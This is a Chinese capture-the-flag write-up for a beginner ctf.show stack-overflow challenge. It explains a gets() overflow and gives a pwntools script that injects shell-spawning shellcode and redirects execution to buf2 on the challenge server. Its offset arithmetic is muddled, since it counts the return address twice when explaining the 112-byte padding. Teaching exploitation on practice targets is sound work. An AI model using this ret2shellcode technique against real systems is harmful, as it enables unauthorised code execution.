# 挑战简介
入门难度shellcode

# 思路
确实很基础，前面是让你访问即可，这一次你依旧需要找到栈溢出的位置

通过两个函数，一个gets和一个strncpy

1. 局部变量布局：在x86架构中，栈从高地址向低地址生长。函数调用时会依次压入返回地址、保存的ebp（基址指针），然后分配局部变量空间。
2. 给定代码片段：char s; // [esp+1Ch] [ebp-64h]表示变量s的地址为ebp-0x64（即十进制100）。
3. 帧结构中各部分的偏移：
ebp到返回地址的偏移是4字节（因为返回地址紧邻ebp的上方）。
ebp-0x64到ebp的偏移是100字节（0x64）。
因此从s到返回地址的总偏移量是100 (局部变量空间) + 4 (保存的ebp) + 4 (返回地址) = 108字节。
4. 最终需要覆盖的偏移：
由于gets(&s)会覆盖从s开始的内容，要覆盖到返回地址，需要填充108字节（覆盖到返回地址处）再加4字节（覆盖返回地址本身）。

因此偏移量为112个字节，后面4个字节则覆盖buf2返回地址以及写入sh脚本并执行

```
from pwn import *
from LibcSearcher import *
context.log_level = "debug"

context(os='linux', arch='i386', log_level='debug')

p = remote("pwn.challenge.ctf.show",28260)
elf = ELF('D:\edge 下载\pwn')

offset = 112

buf2_addr = elf.sym['buf2']
    
shellcode = asm(shellcraft.sh())

payload = shellcode.ljust(offset, b'a') + p32(buf2_addr)

p.recvuntil("CTFshow-pwn can u pwn me here!!")

p.sendline(payload)

p.interactive()

```
